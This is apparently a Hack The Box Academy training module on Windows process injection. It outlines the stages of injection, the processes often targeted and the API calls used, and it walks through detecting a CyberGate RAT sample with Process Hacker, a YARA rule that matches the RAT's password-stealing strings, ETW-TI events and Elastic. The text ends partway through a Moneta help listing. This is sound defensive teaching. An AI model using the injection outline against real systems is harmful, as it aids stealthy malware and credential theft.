# Windows Process Injection Attacks

Process injection is a technique malware uses to run its code within the address space of another process, making it harder to detect and analyze. The idea behind process injection is to stealthily introduce malicious code into the address space of a legitimate process, thereby avoiding detection by security mechanisms that monitor for the creation of new processes or the loading of suspicious executables. This makes it possible for malware to `eliminate the involvement of executable files on the disk`, and it is often called `fileless malware`.

The definition of the process injection [tactic](https://attack.mitre.org/techniques/T1055/) in MITRE ATT&CK framework is as follows:

![](https://academy.hackthebox.com/storage/modules/266/mitre_image1.png)

* * *

## Stages of process injection

Typically, a process injection involves a few stages, i.e., target selection, memory allocation, payload injection, and code execution, as shown in the diagram below:

![Stages of process Injection](https://academy.hackthebox.com/storage/modules/266/image1_.png)

1. `Target Selection and Access`: The attacker identifies a suitable target process or creates a new one.
2. `Memory Allocation`: Memory space within the target process needs to be allocated to hold the malicious code (payload).
3. `Payload Injection`: The attacker writes the malicious code (payload) into the allocated memory space within the target process. This could be shellcode or a PE/DLL as well.
4. `Code Execution`: The final stage involves triggering the execution of the injected code. This can be achieved through various techniques that we'll cover in this module.

* * *

## Common Target processes

The malware utilizing the process injection technique operates in memory without leaving any traces of a malicious executable file on disk, making it harder to detect using traditional antivirus and endpoint security solutions. Malware often targets legitimate processes that are commonly found running on systems. The process injection technique in the [MITRE framework (T1055)](https://attack.mitre.org/techniques/T1055/) lists many examples of different target processes used by malware to inject malicious code.

![](https://academy.hackthebox.com/storage/modules/266/image2.png)

Some of the legitimate processes targeted by malware for process injection attacks are as follows:

| Process Name | Description |
| --- | --- |
| `lsass.exe` | Used for credential theft because it stores credentials used for interactive logons and contains the Local Security Authority (LSA) subsystem. |
| `svchost.exe` | Used for evasion and credential theft, svchost.exe is a generic host process name for services that run from dynamic-link libraries (DLLs), allowing injected code to blend in with legitimate Windows services. |
| `backgroundtaskhost.exe` | A Windows Background Task Host process that runs background tasks. |
| `dllhost.exe` | Used to host COM components, making it a common target for injection to blend in with legitimate COM processes that are expected to have a short lifetime. |
| `regsvr32.exe` | Regsvr32.exe is a legitimate Windows program used to register and unregister Object Linking and Embedding (OLE) controls, allowing injected code to blend in with legitimate usage. |
| `rundll32.exe` | Used to load and run 32-bit dynamic-link libraries. |
| `searchprotocolhost.exe` | A Windows process that handles the indexing of files for Windows Search, providing an opportunity for injected code to blend in. |
| `werfault.exe` | Used for evasion and is known to connect to the internet, as it is the Windows Error Reporting process, making injected code less likely to be detected. |
| `wuauclt.exe` | The Windows Automatic Update Client process. |
| `spoolsv.exe` | Windows Print Spooler service process. |
| `Browser processes` | Commonly used for normalizing network connections and information-stealing/banking trojans, as browsers often have high network activity and access to sensitive information. |

* * *

## Why is process injection done?

The main reasons attackers use the process injection technique to run malicious code are described below:

- `Avoid Static Detection`: The malicious payload should not be present on the disk. When an analyst or threat hunter looks at the alerts and logs and notices the path of an initial access script or executable, they won't be able to locate the dropped file. YARA rules or signature-based detection rules can easily flag this activity. In many scenarios, malware deletes the source file from the disk and injects itself into another running process alongside some solid persistence.
- `Injected malicious code runs in a trusted process`: These processes are targeted because they and their file paths are typically trusted by some security software and whitelisted by detection rules, making them ideal for hiding malicious activities. Since these processes are commonly found running on Windows systems, malicious activity injected into these processes can appear as legitimate system activity, making it harder for security software to detect. For instance, if a SOC Analyst or threat hunter is going through the logs and finds a process running from an unusual location with a custom name, it would look suspicious. Running the malicious code inside a trusted process lets the suspicious events blend in with legitimate activity.
- `Inherit Privileges from target process`: By injecting code into a process, the injected code can also inherit the privileges of that process. This technique allows the injected code to bypass security restrictions and access parts of the operating system or perform actions that would not be possible under normal circumstances.
- `Execute Additional Functionality without Dropping Executables`: Attackers often need to execute additional tools or functionalities without leaving many artifacts on disk. By injecting code directly into a process, they can avoid dropping new executables. For example, an attacker may want to run a tool like [Mimikatz](https://github.com/gentilkiwi/mimikatz) for credential dumping but avoid placing the Mimikatz binary on disk. By injecting Mimikatz code into an already running process, they achieve their goal without creating new files that could be detected.

* * *


# Process Injection Techniques

## Fundamental Questions in Process Injection Attacks

When conducting process injection, an attacker needs to answer three fundamental questions to successfully execute malicious code inside a remote process.

- `What methods can be used to gain access to a remote process?`


  - Before injecting code into another process, a valid handle to that process is needed. This is typically achieved using functions like [OpenProcess()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) or [NtOpenProcess()](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess), which allows an attacker to gain necessary permissions to manipulate another process’s memory.
- `How can code be transferred into the memory space of the target process?`


  - Once a valid handle to the remote process is obtained, the next step is to `inject the payload` into its memory. This involves allocating memory inside the target process and writing the malicious code into it. Some of the WINAPI functions used in the techniques to inject code into remote process are as follows:

    - [VirtualAllocEx()](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) \+ [WriteProcessMemory()](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
    - [NtAllocateVirtualMemory()](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory) \+ [NtWriteVirtualMemory()](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html)
    - [NtMapViewOfSection()](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html)
    - [RtlCopyMemory()](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory)
    - [Reflective DLL Injection](https://github.com/stephenfewer/ReflectiveDLLInjection)
- `What techniques can be employed to execute the injected code within the remote process?`


  - After successfully injecting the payload, the final step is `executing` it. There are several ways to achieve this, ranging from creating new threads to hijacking existing ones. Some of the known techniques are as follows:

    - Creating a [Remote Thread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
    - [Thread Hijacking](https://attack.mitre.org/techniques/T1055/003/) and Context Manipulation
    - [APC](https://attack.mitre.org/techniques/T1055/004/) (Asynchronous Procedure Call) Injection
    - Process [Hollowing](https://attack.mitre.org/techniques/T1055/012/)
    - [Early Bird](https://attack.mitre.org/techniques/T1055/004/) Injection (Variation of APC Injection)

Some of the `WINAPI` and `NTAPI` functions associated with the process injection techniques are mentioned in the figure below.

![Process Injection](https://academy.hackthebox.com/storage/modules/266/winapi-pi_.png)

### Open/Create Process

To begin, an attacker must identify and gain a `handle to a target process`. Functions like [CreateToolHelp32Snapshot()](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot), [Process32First()](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first), [Process32Next()](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next), and [NtQuerySystemInformation()](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation) allow enumeration of processes. The [OpenProcess()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) function is used to obtain a handle to the target process.

Alternatively, a `new process can be created` using functions like [CreateProcessA()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa), [CreateProcessAsUserA()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera), [CreateProcessWithTokenW()](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw), or [CreateProcessWithLogonW()](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw). Additionally, a new process can be created in a `suspended state` using the `CreateProcessA()` function with the `CREATE_SUSPENDED` flag. This allows the attacker to modify the process memory before it starts executing.

### Injected Data

The malicious payload to be injected can take various forms, such as a [DLL](https://en.wikipedia.org/wiki/Dynamic-link_library), [shellcode](https://en.wikipedia.org/wiki/Shellcode), or a new process, using techniques such as [PE Injection](https://attack.mitre.org/techniques/T1055/002/), [Process Hollowing](https://attack.mitre.org/techniques/T1055/012/), and executing code using memory [section](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views).

### Transfer Code to Remote Process

The next step involves `allocating memory` in the remote process to store the payload. Functions like [VirtualAllocEx()](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex), [NtAllocateVirtualMemory()](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory), [VirtualProtectEx()](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex), and [NtProtectVirtualMemory()](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtReadVirtualMemory.html) are used for memory allocation and protection adjustments. The payload is then written to the allocated memory using [WriteProcessMemory()](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory), [NtWriteVirtualMemory()](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html), [RtlCopyMemory()](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory), or [memcpy()](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170).

### Execute Code

To execute the injected payload, attackers can `create a new thread` within the remote process using functions like [CreateRemoteThread()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread), [RtlCreateUserThread()](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FRtlCreateUserThread.html), or [NtCreateThreadEx()](https://ntdoc.m417z.com/ntcreatethreadex). Once the thread is created, the injected code is executed. Alternatively, an existing thread can be manipulated to execute the malicious code.

Additional thread manipulation techniques such as [SuspendThread()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread), [NtSuspendThread()](https://ntdoc.m417z.com/ntsuspendthread), [GetThreadContext()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext), [SetThreadContext()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext), [NtSetContextThread()](https://ntdoc.m417z.com/ntsetcontextthread), [QueueUserAPC()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc), [NtQueueApcThread()](https://ntdoc.m417z.com/ntqueueapcthread), [ResumeThread()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread), [NtResumeThread()](https://malapi.io/winapi/NtResumeThread), and [NtAlertResumeThread()](https://ntdoc.m417z.com/ntqueueapcthreadex) allow attackers to control and manipulate the execution flow of the remote process.

In the next section, we will explore a classic process injection attack and its detection methods.

* * *


# Detections Primer

In this section, we'll explore a scenario where process injection technique is used by a real-world malware [sample](https://bazaar.abuse.ch/sample/07b8f25e7b536f5b6f686c12d04edc37e11347c8acd5c53f98a174723078c365/) from [MalwareBazaar](https://bazaar.abuse.ch/) and go through some of the detections. The malware sample belongs to the [CyberGate](https://malpedia.caad.fkie.fraunhofer.de/details/win.cybergate) Remote Access Trojan, which is known to steal private information like passwords, files, etc. This sample has injected code into a remote process. The screenshot below highlights an overview of the malware loaded in the [IDA](https://hex-rays.com/ida-free) decompiler.

![CyberGate](https://academy.hackthebox.com/storage/modules/266/image3-1.png)

## Dissecting a Classic Process Injection

This malware sample performs basic process injection using the three Windows API functions mentioned below:

- [VirtualAllocEx()](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
- [WriteProcessMemory()](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
- [CreateRemoteThread()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)

The function `VirtualAllocEx()` is used to allocate a region of memory within the virtual address space of a specified process. The `WriteProcessMemory()` function writes data to an area of memory in a specified process. Finally, the `CreateRemoteThread()` function creates a thread that runs in the virtual address space of another process and points to the code written. This is a very basic process injection technique that is easily detected by almost all modern endpoint security solutions.

## Suspicious Memory Region

We executed the sample and opened the Process Hacker to check for any suspicious signs. In Process Hacker, we can check some suspicious signs, such as checking for any `unmapped memory regions` by examining the base address and full path of the module to see if it is from an unusual location. In this case, there is no path, and the permissions of the memory region are `RWX` ( [PAGE\_EXECUTE\_READWRITE](https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)). The `RWX` memory protection flag is suspicious compared to other regions that have the `RX` flag.

![RWX](https://academy.hackthebox.com/storage/modules/266/image4.png)

## Suspicious Thread and Call Stack

Another thing to look at is the `running threads`. When a new thread is created, it is a good idea to investigate the `start address` of the thread and the `call stack`. If the start address points to an `unusual address`, it is suspicious. For example, in this scenario, the start address is `0x0`, which is unusual compared to the other thread addresses. It is also important to note that the call stack investigation shows some calls with no reference to the module or function name but only an address.

![Alt text](https://academy.hackthebox.com/storage/modules/266/image5.png)

This address belongs to the same `RWX` region, which is not mapped to a location on disk. This memory region contains the malicious code, as shown in the screenshot below.

![Alt text](https://academy.hackthebox.com/storage/modules/266/image6.png)

## Suspicious Memory content

The screenshot below shows the signs of a PE (Portable Executable) file inside a memory region of this malware.

![PE](https://academy.hackthebox.com/storage/modules/266/image22.png)

Some signs of [UPX](https://upx.github.io/) packing are present, as the strings `UPX0` and `UPX1` are present.

![UPX](https://academy.hackthebox.com/storage/modules/266/image23.png)

There are also some tool/malware-specific strings present in the memory.

![MUTEX](https://academy.hackthebox.com/storage/modules/266/image24.png)

Memory scanners or YARA rules can detect these kinds of things (strings), as we will see below.

## Yara Scan

An example of a simple YARA rule that can check for these strings in the memory of running processes is as follows.

```cmd-session
rule CyberGate_RAT{

       meta:
           author = "HTB"
           description = "CyberGateRAT"

       strings:
           $s1 = "getpassword|getpasswordlist|"
           $s2 = "ZwUnmapViewOfSection"
           $s3 = "xX_PROXY_SERVER_Xx"
           $s4 = "SPY_NET_RATMUTEX"
           $s5 = "_x_X_PASSWORDLIST_X_x_"
           $s6 = "_x_X_UPDATE_X_x_"
           $s7 = "_x_X_BLOCKMOUSE_X_x_"
       condition:
           all of them
}

```

We executed the sample and after running it, we scanned all running processes through the PowerShell terminal (Run as administrator) using `yara.exe` with the rule created previously:

```powershell
PS C:\injection\tools\yara> Get-Process | ForEach-Object { "Scanning with Yara for CyberGate RAT on PID "+$_.id; & ".\yara.exe" "C:\injection\rules\yara\rules.yara" $_.id 2>null}

Scanning with Yara for CyberGate RAT on PID 1160
Scanning with Yara for CyberGate RAT on PID 1232
Scanning with Yara for CyberGate RAT on PID 1256
Scanning with Yara for CyberGate RAT on PID 1320
Scanning with Yara for CyberGate RAT on PID 5240
Scanning with Yara for CyberGate RAT on PID 6716
Scanning with Yara for CyberGate RAT on PID 4
Scanning with Yara for CyberGate RAT on PID 7040
<SNIP>
Scanning with Yara for CyberGate RAT on PID 2688
Scanning with Yara for CyberGate RAT on PID 2824
Scanning with Yara for CyberGate RAT on PID 2716
Scanning with Yara for CyberGate RAT on PID 6956
CyberGate_RAT 6956
Scanning with Yara for CyberGate RAT on PID 560
Scanning with Yara for CyberGate RAT on PID 652
Scanning with Yara for CyberGate RAT on PID 3684
Scanning with Yara for CyberGate RAT on PID 4144
<SNIP>

```

The scan was able to find the CyberGate RAT running under PID `6956`.

![Yara](https://academy.hackthebox.com/storage/modules/266/yara001.png)

If the scan is performed on PID 6956 with the `--print-strings` flag, it prints the detected strings found in the file. And we can also see the memory addresses where these strings are located:

```powershell
PS C:\injection\tools\yara> .\yara.exe "C:\injection\rules\yara\rules.yara" 6956 --print-strings

CyberGate_RAT 6956

0x29fe51c5467:$s1: getpassword|getpasswordlist|
0x29fe74b8e43:$s1: getpassword|getpasswordlist|
0x29fe98ede75:$s2: ZwUnmapViewOfSection
0x29fe98ede9a:$s2: ZwUnmapViewOfSection
0x29fe98edec3:$s2: ZwUnmapViewOfSection
0x29fe51c557a:$s3: xX_PROXY_SERVER_Xx
0x29fe98c4356:$s3: xX_PROXY_SERVER_Xx
0x29fe98edf11:$s3: xX_PROXY_SERVER_Xx
0x29fe98eff1a:$s3: xX_PROXY_SERVER_Xx
0x29fe98eff3d:$s4: SPY_NET_RATMUTEX
0x29fe9a10301:$s4: SPY_NET_RATMUTEX
0x29fe9af830a:$s4: SPY_NET_RATMUTEX
0x29fe9af89b9:$s4: SPY_NET_RATMUTEX
0x29fe9afd350:$s4: SPY_NET_RATMUTEX
0x29fe51c5608:$s5: _x_X_PASSWORDLIST_X_x_
0x29fe51c5656:$s5: _x_X_PASSWORDLIST_X_x_
0x29fe745a9dc:$s5: _x_X_PASSWORDLIST_X_x_
0x29fe745aa02:$s5: _x_X_PASSWORDLIST_X_x_
0x29fe98af96c:$s5: _x_X_PASSWORDLIST_X_x_
0x29fe51c567b:$s6: _x_X_UPDATE_X_x_
0x29fe51c569b:$s6: _x_X_UPDATE_X_x_
0x29fe51c56dc:$s6: _x_X_UPDATE_X_x_
0x29fe745aa9b:$s6: _x_X_UPDATE_X_x_
0x29fe745aabb:$s6: _x_X_UPDATE_X_x_
0x29fe98f009b:$s7: _x_X_BLOCKMOUSE_X_x_
0x29fe98f00be:$s7: _x_X_BLOCKMOUSE_X_x_
0x29fe98f00e2:$s7: _x_X_BLOCKMOUSE_X_x_
0x29fe98f0106:$s7: _x_X_BLOCKMOUSE_X_x_
0x29fe98f012a:$s7: _x_X_BLOCKMOUSE_X_x_
0x29fe98f014e:$s7: _x_X_BLOCKMOUSE_X_x_
0x29fe98f0173:$s7: _x_X_BLOCKMOUSE_X_x_

```

In Process Hacker, we can see that the memory of the process with PID 6956 contains the string `SPY_NET_RATMUTEX` at memory location `0x29fe9afd350`.

![Yara](https://academy.hackthebox.com/storage/modules/266/yara002.png)

**Note:** After completing this activity, perform the Yara scan on all running processes and terminate all the detected processes using Task Manager.

* * *

## ETW-TI Based Detections

This activity can also be detected through Microsoft's ETW Threat-Intelligence (TI) provider, a [manifest-based](https://github.com/repnz/etw-providers-docs/blob/master/Manifests-Win10-17134/Microsoft-Windows-Threat-Intelligence.xml) provider that generates security-related events. This is kernel-level tracing, and the ETW provider is available for subscription to processes running with PPL-Antimalware level of protection. This sensor can detect activities such as memory allocation, memory writing, setting thread context, and other techniques. Many EDR solution vendors leverage this ETW provider.

Some of the unique events provided by this ETW provider are as follows:

```cmd-session
KERNEL_THREATINT_TASK_ALLOCVM_LOCAL
KERNEL_THREATINT_TASK_ALLOCVM_REMOTE
KERNEL_THREATINT_TASK_WRITEVM_LOCAL
KERNEL_THREATINT_TASK_WRITEVM_REMOTE
KERNEL_THREATINT_TASK_PROTECTVM_LOCAL
KERNEL_THREATINT_TASK_PROTECTVM_REMOTE
KERNEL_THREATINT_TASK_SETTHREADCONTEXT_LOCAL
KERNEL_THREATINT_TASK_SETTHREADCONTEXT_REMOTE
KERNEL_THREATINT_TASK_READVM_LOCAL
KERNEL_THREATINT_TASK_READVM_REMOTE
KERNEL_THREATINT_TASK_MAPVIEW_LOCAL
KERNEL_THREATINT_TASK_MAPVIEW_REMOTE
KERNEL_THREATINT_TASK_QUEUEUSERAPC_LOCAL
KERNEL_THREATINT_TASK_QUEUEUSERAPC_REMOTE

```

In the later sections, we'll discuss how we can consume events from this provider. We'll use an open-source tool, [Sealighter-TI](https://github.com/pathtofile/SealighterTI), to log real-time events from this provider.

## Elastic EDR

One example of a security solution that also utilizes the event trace from this provider is [Elastic](https://docs.elastic.co/en/integrations/endpoint). The blog [post](https://www.elastic.co/security-labs/doubling-down-etw-callstacks) shows that Elastic (having its roots in Endgame, an EDR used to perform in-memory threat detection) creates detections based on Kernel ETW call stacks.

**Note:** This portion of the section is just informative. While Elastic EDR is not covered in the lab, understanding how Elastic EDR detects these kinds of threats is helpful.

Elastic EDR uses behavioral analytics, detection rules based on memory scanning, API call monitoring, process ancestry analysis (such as unusual parent-child relationships and inconsistencies, such as a high-privilege process being spawned by a low-privilege process), event correlation, and much more. A free 14-day trial can be availed from this link. However, the behavior rules are available in their GitHub [repository](https://github.com/elastic/protections-artifacts/tree/main/behavior/rules), which detection engineers can study to understand the detection logic. We'll also go through some rules in the later sections.

We executed this sample with [Elastic Defend](https://www.elastic.co/guide/en/integrations/current/endpoint.html) running on the endpoint, and it generated many alerts for this activity, as shown in the screenshot below:

![Elastic-Defend](https://academy.hackthebox.com/storage/modules/266/elasticdefend.png)

In the `Analytics` -\> `Discover` tab in Elastic, the details about each behavioral event can be checked under the `event.code: "behavior"`.

![Elastic-Defend](https://academy.hackthebox.com/storage/modules/266/elasticdefend-1.png)

This also provides a detailed call stack trace, which shows an ordered sequence of the functions that are executed to achieve the behavior of a program. This shows the details of which functions (and their associated modules) were executed.

The screenshot below shows the process creation call stack:

![Elastic-Defend](https://academy.hackthebox.com/storage/modules/266/elasticdefend-2.png)

The File, registry, and library call stack fields are shown in the screenshot below:

![Elastic-Defend](https://academy.hackthebox.com/storage/modules/266/elasticdefend-4.png)

The field `Target.process.Ext.memory_region.strings` shows an array of strings found within the memory region. Detection rules can be created by using filters on this field.

![Elastic-Defend](https://academy.hackthebox.com/storage/modules/266/elasticdefend-5.png)

In the screenshot below, we can see that the source of these events is the same provider " `Microsoft-Windows-Threat-Intelligence`".

![Elastic-Defend](https://academy.hackthebox.com/storage/modules/266/elasticdefend-3.png)

Elastic also supports [ES\|QL](https://www.elastic.co/blog/esql-elasticsearch-piped-query-language) (Elasticsearch Query Language), which transforms, enriches, and simplifies data investigations. For example, the ES\|QL query below can list the count of behavioral events for unique PIDs.

```ES|QL
from logs-*
| where event.code == "behavior"
| stats alerts_count=count(*), unique_pid_count=count_distinct(process.entity_id) by rule.name

```

![Elastic-Defend](https://academy.hackthebox.com/storage/modules/266/elasticdefendeql.png)

## Tips for detections

The points below summarize the above scenario, and we have a few things to remember while dealing with process injection attacks.

- `Thread start address`: As we saw in the previous scenario of the CyberGate malware, the `thread start address` was not associated with a `memory-mapped file`.
- `Memory Permissions`: Extremely detectable permissions such as `RWX` (PAGE\_EXECUTE\_READWRITE) should be checked. Processes should be monitored for any odd allocations, and protection patterns.
- `Memory content`: Look for any `signs of a PE` File in the `memory content`. Also, check for any strings associated with malicious tools or common techniques. This can be achieved by using memory scanners.
- `Process Context`: When investigating process injection attacks, it is important to understand the process context. Sometimes, a malware process uses an `unusual parent-child process relationship`. Other times, a malware process injected into another process misses important `command-line arguments`, whereas the legitimate program often includes specific arguments. For example, a `rundll32.exe` without arguments suggests suspicious activity.
- `Unexpected network traffic`: Unexpected network traffic from a process that is `not supposed to connect to the internet` is a red flag. For example, a `notepad.exe` process initiating a network connection is unusual.
- `Unusual System Calls`: Monitor system calls made by the process. Process injections involve `specific APIs` for memory allocation, writing, and permission changes. We should determine whether the process is supposed to make these system calls or not.

In the later sections, we will also explore many practical and hands-on scenarios using [Moneta](https://github.com/forrest-orr/moneta) and [PE-sieve](https://github.com/hasherezade/pe-sieve) for memory-based detections.


# Tools Usage

First thing that we should know is the way to transfer any files from the pwnbox to the target (VM) using RDP. The easiest way is to add a shared drive.

```shell
xfreerdp /u:<username> /p:<password> /v:<Target_IP> /dynamic-resolution /cert:ignore /drive:.,linux

```

The option `/drive:.,linux` in the above command mounts the shared drive of pwnbox on the Windows target (VM). And the files are available on the Windows target (VM) as well.

There are several tools mentioned and used in the module that are commonly employed in security research and system analysis, such as debuggers like [x64dbg](https://x64dbg.com/) and [API Monitor](http://www.rohitab.com/apimonitor) to inspect API calls, and [WinDbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/) to view important structures, among others. In this section, we'll explore the usage of these tools and go through the different tools used throughout the module.

Within the target (VM), we can locate the tools at the following paths:

| Name | Path |
| --- | --- |
| **API Monitor** | `C:\Program Files\rohitab.com\API Monitor\apimonitor-x64.exe` |
| **x64dbg** | `C:\Tools\x64dbg\release\x64\x64dbg.exe` |
| **SysinternalsSuite** | `C:\Tools\SysinternalsSuite` |
| **ProcessHacker** | `C:\Tools\ProcessHacker\ProcessHacker.exe` |
| **Moneta** | `C:\Tools\Moneta64.exe` |
| **PE-Sieve** | `C:\Tools\pe-sieve64.exe` |
| **Atomic Red Team** | `C:\AtomicRedTeam\invoke-atomicredteam` |

* * *

## WinDbg

[WinDbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/) is a powerful debugger tool from Microsoft primarily used for analyzing and debugging Windows applications, drivers, and the operating system itself. It provides a command-line interface and a graphical user interface, making it suitable for a wide range of debugging tasks, including kernel-mode and user-mode debugging.

**Note:** Local Kernel debugging is already enabled on the target (VM).

To start local kernel debugging, we can launch WinDbg as an administrator and go to " `File`" \> " `Start debugging`" \> " `Attach to Kernel`" \> " `Local`". Click `OK` to start debugging. To view a process structure, we first need to find the `EPROCESS` structure for the process we're interested in. We can use the `!process 0 0` command to list all processes and find the address of the `EPROCESS` structure for the process we want to examine. For example:

![Detect](https://academy.hackthebox.com/storage/modules/266/win-procenum.png)

The command below displays the layout of the `_EPROCESS` structure template defined in the Windows symbol file. It shows the structure's members and their types, but it does not display any actual data. It's like a blueprint for the structure.

```windbg
dt nt!_EPROCESS

```

Throughout this module, we'll utilize different commands in WinDbg as needed.

* * *

## x64dbg

[x64dbg](https://x64dbg.com/) is a user-mode debugger for Windows, commonly used for reverse engineering and malware analysis. It provides a graphical interface that allows us to inspect registers, breakpoints, and memory structures interactively. Some important points related to `x64dbg` are as follows:

- Attach x64dbg to a process ( `File` \> `Attach` or `Alt+A`).
- Set breakpoints on API calls ( `bp CreateProcessA`).
- Step through execution ( `F7` for step into, `F8` for step over).
- Analyze strings and memory ( `View` \> `Memory Map`).

Here is a sample workflow within `x64dbg` to familiarize ourselves with its operations:

- Launch x64dbg.
- At the top of the x64dbg interface, click the `File` menu.
- Select `Open` to choose the executable file we wish to debug.
- `Browse` to the directory containing the executable and select it. (In this example, we browsed to the location of `cmd.exe`)
- Optionally, command-line arguments or the working directory can be specified in the dialog box that appears.
- Click `OK` to load the executable into `x64dbg`.

When we launch an executable in `x64dbg`, the main window is paused on a default breakpoint at the program's entry point. It reveals the disassembly view (as shown in the top left in the screenshot below), which shows the live `assembly instructions` of the program helping in understanding the `code flow`.

At the top right, the register window shows the `values of CPU registers`, helping us in understanding the program's state. At the bottom right, the stack view displays the `current stack frame`, enabling the inspection of `function calls` and `local variables`. On the bottom left, we can check the memory dump view, representing the program's memory at specified memory addresses, that helps us in inspecting the memory content.

![Detect](https://academy.hackthebox.com/storage/modules/266/win-dbg.png)

Throughout this module, we'll use x64dbg for debugging as required.

* * *

## Process Hacker

`Process Hacker` is an advanced task manager and process explorer used to monitor running processes, threads, and memory usage. It is useful for detecting hidden or suspicious processes, content of process memory, thread call stack etc. Some important points related to Process Hacker are as follows:

- View detailed process information ( `Right-click` \> `Properties`).
- View and Dump Process Memory content
- Check memory permissions (such as `RX`, `RWX`)
- Kill malicious processes ( `Right-click` \> `Terminate`).
- Modify process privileges and access tokens.
- Inspect open handles, DLLs, and threads ( `View` \> `Handles`).

We can find an overview of `Process Hacker` below:

![Detect](https://academy.hackthebox.com/storage/modules/266/win-phck.png)

We'll keep using Process Hacker for inspecting different process components as required.

There are other tools also included, such as [Process Explorer](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer), part of [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/), which provide detailed insights into process hierarchy, open handles, loaded DLLs, and security privileges. [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) ( `ProcMon`) is another tool from Sysinternals, which is a real-time event logging tool that tracks file system, registry, process, and network activity.

* * *

## API Monitor

`API Monitor` is used to monitor and log API calls made by applications, which is useful for understanding program behavior and analyzing the function call trace. The running processes pane in the bottom left allows us (researchers) to pick the process for monitoring. The `API Filter` pane allows the filtering of the API functions to be monitored. The `Monitored Processes` pane shows the list of processes that are currently being monitored.

![Detect](https://academy.hackthebox.com/storage/modules/266/win-api1.png)

The API summary pane shows the list of API function calls with their parameters:

![Detect](https://academy.hackthebox.com/storage/modules/266/win-api2.png)

We can use this tool to do API monitoring and to view the information of parameters passed to the specific Windows API functions, when called by an application.

* * *

## Sysmon

[Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) is another tool from the Sysinternals suite that monitors and logs system activity, with a focus on detecting and analyzing malicious activity. It provides detailed information about process creations, network connections, and changes to file creation times, among other things.

Sysmon is already running in the background as a service in the module target (VM). We can view the `Sysmon Event Logs` in the `Event Viewer` under the path `Application and Service Logs` \> `Microsoft-Windows-Sysmon/Operational` as shown in the screenshot below:

![Proc Mon](https://academy.hackthebox.com/storage/modules/266/win-sysmon.png)

* * *

## Moneta

[Moneta](https://github.com/forrest-orr/moneta) is a live user-mode memory analysis tool for Windows with the capability to detect malware IOCs such as process injection and memory anomalies like hollowing, reflective DLL injection, and code caves. While the malware is running, we can use Moneta. Let's print the help section by using the `--help` flag:

```powershell
PS C:\injection\tools> .\Moneta64.exe --help
   _____                        __
  /     \   ____   ____   _____/  |______
 /  \ /  \ /  _ \ /    \_/ __ \   __\__  \
/    Y    (  <_> )   |  \  ___/|  |  / __ \_
\____|__  /\____/|___|  /\___  >__| (____  /
        \/            \/     \/          \/

Moneta v1.0 | Forrest Orr | 2020

REQUIRED

-m {*|region|referenced|ioc}
-p {*|PID}

OPTIONAL

-v {detail|debug|surface}
-d
--option {from-base|statistics}
